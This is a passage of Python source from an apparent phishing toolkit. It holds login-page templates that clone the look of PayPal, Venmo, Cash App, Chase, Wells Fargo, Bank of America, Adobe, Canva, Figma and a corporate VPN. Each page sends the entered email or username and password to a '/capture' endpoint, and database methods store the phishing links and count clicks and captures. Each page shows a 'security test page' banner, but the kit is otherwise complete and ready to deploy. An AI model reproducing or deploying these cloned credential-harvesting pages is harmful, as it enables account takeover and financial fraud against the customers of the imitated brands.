        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background: linear-gradient(135deg, #003087 0%, #009cde 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 150px; height: 50px; }
        .login-box { background: #fff; border-radius: 8px; padding: 40px; box-shadow: 0 4px 20px rgba(0,0,0,0.2); }
        h1 { font-size: 24px; margin-bottom: 30px; color: #2c2e2f; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #0070ba; }
        .forgot { text-align: right; margin: 10px 0; }
        .forgot a { color: #0070ba; text-decoration: none; font-size: 14px; }
        button { width: 100%; padding: 14px; background: #0070ba; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
        button:hover { background: #005ea6; }
        .signup { text-align: center; margin-top: 20px; padding-top: 20px; border-top: 1px solid #eee; }
        .signup a { color: #0070ba; text-decoration: none; font-weight: 600; }
        .warning { margin-top: 20px; padding: 12px; background: #fff3cd; border: 1px solid #ffeeba; border-radius: 4px; color: #856404; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><svg viewBox="0 0 150 50"><text x="20" y="35" fill="white" font-size="28" font-weight="bold">PayPal</text></svg></div>
        <div class="login-box">
            <h1>Log in to your account</h1>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email address" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <div class="forgot"><a href="#">Forgot password?</a></div>
                <button type="submit">Log In</button>
            </form>
            <div class="signup"><a href="#">Sign up</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_venmo_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Venmo - Log In</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #3d95ce; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 150px; height: 50px; }
        .login-box { background: #fff; border-radius: 8px; padding: 40px; box-shadow: 0 4px 20px rgba(0,0,0,0.2); }
        h1 { font-size: 24px; margin-bottom: 30px; color: #1f1f1f; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #3d95ce; }
        .remember { display: flex; align-items: center; margin: 15px 0; }
        .remember input { margin-right: 8px; }
        button { width: 100%; padding: 14px; background: #3d95ce; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
        button:hover { background: #2d7db3; }
        .links { margin: 20px 0; text-align: center; }
        .links a { color: #3d95ce; text-decoration: none; font-size: 14px; }
        .signup { text-align: center; margin-top: 20px; }
        .signup a { color: #3d95ce; text-decoration: none; }
        .warning { margin-top: 20px; padding: 12px; background: #fff3cd; border: 1px solid #ffeeba; border-radius: 4px; color: #856404; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><svg viewBox="0 0 150 50"><text x="20" y="35" fill="white" font-size="28" font-weight="bold">Venmo</text></svg></div>
        <div class="login-box">
            <h1>Log in</h1>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email or phone" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <div class="remember"><input type="checkbox" id="remember"><label for="remember">Remember me</label></div>
                <button type="submit">Log In</button>
                <div class="links"><a href="#">Forgot password?</a></div>
            </form>
            <div class="signup"><a href="#">Sign up for Venmo</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_cashapp_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Cash App - Sign In</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #00d64f; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 150px; height: 50px; }
        .login-box { background: #fff; border-radius: 12px; padding: 40px; box-shadow: 0 4px 20px rgba(0,0,0,0.2); }
        h1 { font-size: 24px; margin-bottom: 30px; color: #000; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #00d64f; }
        .qr-login { text-align: center; margin: 20px 0; }
        .qr-login img { width: 120px; height: 120px; background: #f5f5f5; border-radius: 8px; }
        button { width: 100%; padding: 14px; background: #00d64f; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; }
        button:hover { background: #00b544; }
        .links { margin: 20px 0; text-align: center; }
        .links a { color: #00d64f; text-decoration: none; font-size: 14px; }
        .signup { text-align: center; margin-top: 20px; }
        .signup a { color: #00d64f; text-decoration: none; }
        .warning { margin-top: 20px; padding: 12px; background: #fff3cd; border: 1px solid #ffeeba; border-radius: 8px; color: #856404; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><svg viewBox="0 0 150 50"><text x="20" y="35" fill="white" font-size="28" font-weight="bold">Cash App</text></svg></div>
        <div class="login-box">
            <h1>Sign In</h1>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email or phone" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <div class="qr-login"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='120' height='120'%3E%3Crect width='120' height='120' fill='%23f5f5f5'/%3E%3Ctext x='20' y='60' fill='%23999'%3EQR%20Code%3C/text%3E%3C/svg%3E" alt="QR Code"><p>Scan to log in</p></div>
                <button type="submit">Sign In</button>
                <div class="links"><a href="#">Forgot password?</a></div>
            </form>
            <div class="signup"><a href="#">Create account</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_chase_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Chase - Sign In</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #1f4b8e; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 200px; height: 60px; }
        .login-box { background: #fff; border-radius: 8px; padding: 40px; box-shadow: 0 4px 20px rgba(0,0,0,0.2); }
        h1 { font-size: 24px; margin-bottom: 30px; color: #1f4b8e; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #1f4b8e; }
        .remember { display: flex; align-items: center; margin: 15px 0; }
        .remember input { margin-right: 8px; }
        button { width: 100%; padding: 14px; background: #1f4b8e; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
        button:hover { background: #163a6b; }
        .links { margin: 20px 0; text-align: center; }
        .links a { color: #1f4b8e; text-decoration: none; font-size: 14px; }
        .signup { text-align: center; margin-top: 20px; }
        .signup a { color: #1f4b8e; text-decoration: none; }
        .warning { margin-top: 20px; padding: 12px; background: #fff3cd; border: 1px solid #ffeeba; border-radius: 4px; color: #856404; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><svg viewBox="0 0 200 60"><text x="20" y="40" fill="white" font-size="28" font-weight="bold">CHASE 💳</text></svg></div>
        <div class="login-box">
            <h1>Sign in</h1>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="username" placeholder="Username" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <div class="remember"><input type="checkbox" id="remember"><label for="remember">Remember me</label></div>
                <button type="submit">Sign In</button>
                <div class="links"><a href="#">Forgot username/password?</a></div>
            </form>
            <div class="signup"><a href="#">Enroll now</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_wellsfargo_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Wells Fargo - Sign On</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #c8102e; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 200px; height: 60px; }
        .login-box { background: #fff; border-radius: 8px; padding: 40px; box-shadow: 0 4px 20px rgba(0,0,0,0.2); }
        h1 { font-size: 24px; margin-bottom: 30px; color: #c8102e; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #c8102e; }
        .remember { display: flex; align-items: center; margin: 15px 0; }
        .remember input { margin-right: 8px; }
        button { width: 100%; padding: 14px; background: #c8102e; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
        button:hover { background: #a00d25; }
        .links { margin: 20px 0; text-align: center; }
        .links a { color: #c8102e; text-decoration: none; font-size: 14px; }
        .signup { text-align: center; margin-top: 20px; }
        .signup a { color: #c8102e; text-decoration: none; }
        .warning { margin-top: 20px; padding: 12px; background: #fff3cd; border: 1px solid #ffeeba; border-radius: 4px; color: #856404; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><svg viewBox="0 0 200 60"><text x="20" y="40" fill="white" font-size="28" font-weight="bold">WELLS FARGO</text></svg></div>
        <div class="login-box">
            <h1>Sign On</h1>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="username" placeholder="Username" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <div class="remember"><input type="checkbox" id="remember"><label for="remember">Remember me</label></div>
                <button type="submit">Sign On</button>
                <div class="links"><a href="#">Forgot password?</a></div>
            </form>
            <div class="signup"><a href="#">Enroll</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_bofa_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Bank of America - Sign In</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #012169; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 200px; height: 60px; }
        .login-box { background: #fff; border-radius: 8px; padding: 40px; box-shadow: 0 4px 20px rgba(0,0,0,0.2); }
        h1 { font-size: 24px; margin-bottom: 30px; color: #012169; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #012169; }
        .remember { display: flex; align-items: center; margin: 15px 0; }
        .remember input { margin-right: 8px; }
        button { width: 100%; padding: 14px; background: #012169; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
        button:hover { background: #001845; }
        .links { margin: 20px 0; text-align: center; }
        .links a { color: #012169; text-decoration: none; font-size: 14px; }
        .signup { text-align: center; margin-top: 20px; }
        .signup a { color: #012169; text-decoration: none; }
        .warning { margin-top: 20px; padding: 12px; background: #fff3cd; border: 1px solid #ffeeba; border-radius: 4px; color: #856404; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><svg viewBox="0 0 200 60"><text x="20" y="40" fill="white" font-size="28" font-weight="bold">Bank of America</text></svg></div>
        <div class="login-box">
            <h1>Sign In</h1>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="username" placeholder="Online ID" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Passcode" required></div>
                <div class="remember"><input type="checkbox" id="remember"><label for="remember">Remember me</label></div>
                <button type="submit">Sign In</button>
                <div class="links"><a href="#">Forgot ID/Passcode?</a></div>
            </form>
            <div class="signup"><a href="#">Enroll</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    # ==================== CREATIVE TEMPLATES ====================
    
    def _get_adobe_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Adobe ID</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'adobe-clean', 'Helvetica Neue', Helvetica, Arial, sans-serif; background: linear-gradient(135deg, #eb1000 0%, #a01b5e 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 150px; height: 50px; }
        .login-box { background: #fff; border-radius: 8px; padding: 40px; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
        h1 { font-size: 28px; margin-bottom: 10px; color: #333; }
        .subtitle { color: #666; margin-bottom: 30px; font-size: 14px; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #eb1000; }
        .remember { display: flex; align-items: center; margin: 15px 0; }
        .remember input { margin-right: 8px; }
        button { width: 100%; padding: 14px; background: #eb1000; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
        button:hover { background: #c20e00; }
        .links { margin: 20px 0; text-align: center; }
        .links a { color: #eb1000; text-decoration: none; font-size: 14px; }
        .signup { text-align: center; margin-top: 20px; }
        .signup a { color: #eb1000; text-decoration: none; }
        .warning { margin-top: 20px; padding: 12px; background: #fff3cd; border: 1px solid #ffeeba; border-radius: 4px; color: #856404; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><svg viewBox="0 0 150 50"><text x="20" y="35" fill="white" font-size="28" font-weight="bold">Adobe</text></svg></div>
        <div class="login-box">
            <h1>Sign in</h1>
            <div class="subtitle">to continue to Adobe Creative Cloud</div>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email address" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <div class="remember"><input type="checkbox" id="remember"><label for="remember">Stay signed in</label></div>
                <button type="submit">Sign in</button>
                <div class="links"><a href="#">Forgot password?</a></div>
            </form>
            <div class="signup"><a href="#">Create an account</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_canva_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Canva - Log in</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Canva Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif; background: linear-gradient(135deg, #7750e9 0%, #4a90e2 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 120px; height: 40px; }
        .login-box { background: #fff; border-radius: 12px; padding: 40px; box-shadow: 0 4px 20px rgba(0,0,0,0.2); }
        h1 { font-size: 28px; margin-bottom: 30px; color: #413b5e; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #7750e9; }
        button { width: 100%; padding: 14px; background: #7750e9; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; }
        button:hover { background: #5f3ec9; }
        .links { margin: 20px 0; text-align: center; }
        .links a { color: #7750e9; text-decoration: none; font-size: 14px; }
        .signup { text-align: center; margin-top: 20px; }
        .signup a { color: #7750e9; text-decoration: none; font-weight: 600; }
        .warning { margin-top: 20px; padding: 12px; background: #fff3cd; border: 1px solid #ffeeba; border-radius: 8px; color: #856404; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><svg viewBox="0 0 120 40"><text x="20" y="30" fill="white" font-size="24" font-weight="bold">Canva</text></svg></div>
        <div class="login-box">
            <h1>Log in to Canva</h1>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email address" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit">Log in</button>
                <div class="links"><a href="#">Forgot password?</a></div>
            </form>
            <div class="signup"><a href="#">Sign up for Canva</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_figma_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Figma - Log in</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; background: #0d0d0d; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 100px; height: 30px; }
        .login-box { background: #1e1e1e; border-radius: 12px; padding: 40px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
        h1 { font-size: 28px; margin-bottom: 30px; color: #fff; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px; background: #2b2b2b; border: 1px solid #3b3b3b; border-radius: 8px; color: #fff; font-size: 16px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #a259ff; }
        button { width: 100%; padding: 14px; background: #a259ff; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; }
        button:hover { background: #8a3ff0; }
        .links { margin: 20px 0; text-align: center; }
        .links a { color: #a259ff; text-decoration: none; font-size: 14px; }
        .signup { text-align: center; margin-top: 20px; }
        .signup a { color: #a259ff; text-decoration: none; }
        .warning { margin-top: 20px; padding: 12px; background: #332211; border: 1px solid #a259ff; border-radius: 8px; color: #cc99ff; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><svg viewBox="0 0 100 30"><text x="20" y="22" fill="white" font-size="20" font-weight="bold">Figma</text></svg></div>
        <div class="login-box">
            <h1>Log in to Figma</h1>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email address" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit">Log in</button>
                <div class="links"><a href="#">Forgot password?</a></div>
            </form>
            <div class="signup"><a href="#">Create account</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    # ==================== CUSTOM TEMPLATES ====================
    
    def _get_custom_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .login-box { background: white; border-radius: 10px; padding: 40px; box-shadow: 0 15px 35px rgba(0,0,0,0.2); }
        h1 { text-align: center; color: #333; margin-bottom: 30px; font-size: 28px; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 5px; font-size: 16px; outline: none; transition: border-color 0.3s; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #667eea; }
        button { width: 100%; padding: 15px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; border-radius: 5px; font-size: 16px; font-weight: 600; cursor: pointer; transition: transform 0.2s; }
        button:hover { transform: translateY(-2px); }
        .links { text-align: center; margin-top: 20px; }
        .links a { color: #667eea; text-decoration: none; font-size: 14px; }
        .warning { margin-top: 20px; padding: 12px; background: #fff3cd; border: 1px solid #ffeeba; border-radius: 5px; color: #856404; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <h1>Sign In</h1>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email or Username" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit">Sign In</button>
                <div class="links"><a href="#">Forgot password?</a></div>
            </form>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_modern_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Modern Login</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f7fafc; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 380px; width: 100%; }
        .login-card { background: white; border-radius: 24px; padding: 48px 40px; box-shadow: 0 20px 40px rgba(0,0,0,0.05), 0 1px 3px rgba(0,0,0,0.1); }
        h1 { font-size: 32px; font-weight: 700; color: #1a202c; margin-bottom: 8px; }
        .subtitle { color: #718096; font-size: 16px; margin-bottom: 32px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; font-size: 14px; font-weight: 500; color: #4a5568; margin-bottom: 8px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 12px 16px; border: 1px solid #e2e8f0; border-radius: 12px; font-size: 15px; outline: none; transition: all 0.2s; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #4299e1; box-shadow: 0 0 0 3px rgba(66,153,225,0.15); }
        .forgot-link { text-align: right; margin: 8px 0 24px; }
        .forgot-link a { color: #4299e1; text-decoration: none; font-size: 14px; font-weight: 500; }
        button { width: 100%; padding: 14px; background: #4299e1; color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
        button:hover { background: #3182ce; }
        .signup { text-align: center; margin-top: 24px; font-size: 15px; color: #718096; }
        .signup a { color: #4299e1; text-decoration: none; font-weight: 500; }
        .warning { margin-top: 24px; padding: 12px; background: #feebc8; border: 1px solid #fbd38d; border-radius: 12px; color: #c05621; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-card">
            <h1>Welcome back</h1>
            <div class="subtitle">Please enter your details to sign in</div>
            <form method="POST" action="/capture">
                <div class="form-group"><label>Email</label><input type="text" name="email" placeholder="hello@example.com" required></div>
                <div class="form-group"><label>Password</label><input type="password" name="password" placeholder="••••••••" required></div>
                <div class="forgot-link"><a href="#">Forgot password?</a></div>
                <button type="submit">Sign in</button>
            </form>
            <div class="signup">Don't have an account? <a href="#">Create account</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_corporate_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Corporate VPN Login</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #e5e7eb; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .corporate-bar { background: #1e3a8a; color: white; padding: 20px; text-align: center; border-radius: 8px 8px 0 0; }
        .corporate-bar h2 { font-size: 18px; font-weight: 400; }
        .login-box { background: white; padding: 40px; border-radius: 0 0 8px 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 80px; height: 80px; }
        h1 { font-size: 24px; color: #1f2937; margin-bottom: 8px; text-align: center; }
        .subtitle { text-align: center; color: #6b7280; margin-bottom: 30px; font-size: 14px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; font-size: 14px; font-weight: 500; color: #374151; margin-bottom: 4px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 12px; border: 1px solid #d1d5db; border-radius: 4px; font-size: 15px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #1e3a8a; box-shadow: 0 0 0 2px rgba(30,58,138,0.1); }
        .options { display: flex; justify-content: space-between; align-items: center; margin: 20px 0; }
        .remember { display: flex; align-items: center; }
        .remember input { margin-right: 8px; }
        .remember label { font-size: 14px; color: #4b5563; }
        .forgot a { color: #1e3a8a; text-decoration: none; font-size: 14px; }
        button { width: 100%; padding: 14px; background: #1e3a8a; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
        button:hover { background: #2563eb; }
        .security-note { margin-top: 20px; padding: 12px; background: #f3f4f6; border-left: 4px solid #1e3a8a; font-size: 13px; color: #4b5563; }
        .warning { margin-top: 20px; padding: 12px; background: #fff3cd; border: 1px solid #ffeeba; border-radius: 4px; color: #856404; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="corporate-bar"><h2>🔒 CORPORATE VPN ACCESS</h2></div>
        <div class="login-box">
            <div class="logo"><svg viewBox="0 0 80 80"><circle cx="40" cy="40" r="40" fill="#1e3a8a"/><text x="25" y="50" fill="white" font-size="24" font-weight="bold">🔒</text></svg></div>
            <h1>Secure Login</h1>
            <div class="subtitle">Enter your corporate credentials</div>
            <form method="POST" action="/capture">
                <div class="form-group"><label>Username</label><input type="text" name="username" placeholder="domain\\username" required></div>
                <div class="form-group"><label>Password</label><input type="password" name="password" placeholder="••••••••" required></div>
                <div class="options"><div class="remember"><input type="checkbox" id="remember"><label for="remember">Remember me</label></div><div class="forgot"><a href="#">Forgot password?</a></div></div>
                <button type="submit">Sign In</button>
            </form>
            <div class="security-note">⚡ For security reasons, please log out and close your browser when done.</div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    # ==================== Database CRUD Methods ====================
    
    def save_phishing_link(self, link: PhishingLink) -> bool:
        """Save phishing link to database"""
        try:
            self.cursor.execute('''
                INSERT INTO phishing_links 
                (id, platform, platform_category, phishing_url, original_url, template_name, 
                 clicks, captures, active, qr_code_path, short_url, notes)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (link.id, link.platform, link.platform_category, link.phishing_url, 
                  link.original_url, link.template_name, link.clicks, link.captures,
                  link.active, link.qr_code_path, link.short_url, link.notes))
            self.conn.commit()
            self._update_stats(datetime.datetime.now().strftime('%Y-%m-%d'), 'links')
            return True
        except Exception as e:
            logger.error(f"Failed to save phishing link: {e}")
            return False
    
    def get_phishing_links(self, active_only: bool = True, category: str = None) -> List[Dict]:
        """Get phishing links with optional filters"""
        try:
            query = "SELECT * FROM phishing_links"
            params = []
            
            if active_only:
                query += " WHERE active = 1"
            else:
                query += " WHERE 1=1"
            
            if category:
                query += " AND platform_category = ?"
                params.append(category)
            
            query += " ORDER BY created_at DESC"
            
            self.cursor.execute(query, params)
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get phishing links: {e}")
            return []
    
    def get_phishing_link(self, link_id: str) -> Optional[Dict]:
        """Get phishing link by ID"""
        try:
            self.cursor.execute('SELECT * FROM phishing_links WHERE id = ?', (link_id,))
            row = self.cursor.fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get phishing link: {e}")
            return None
    
    def update_phishing_link_clicks(self, link_id: str):
        """Update click count for phishing link"""
        try:
            self.cursor.execute('UPDATE phishing_links SET clicks = clicks + 1 WHERE id = ?', (link_id,))
            self.conn.commit()
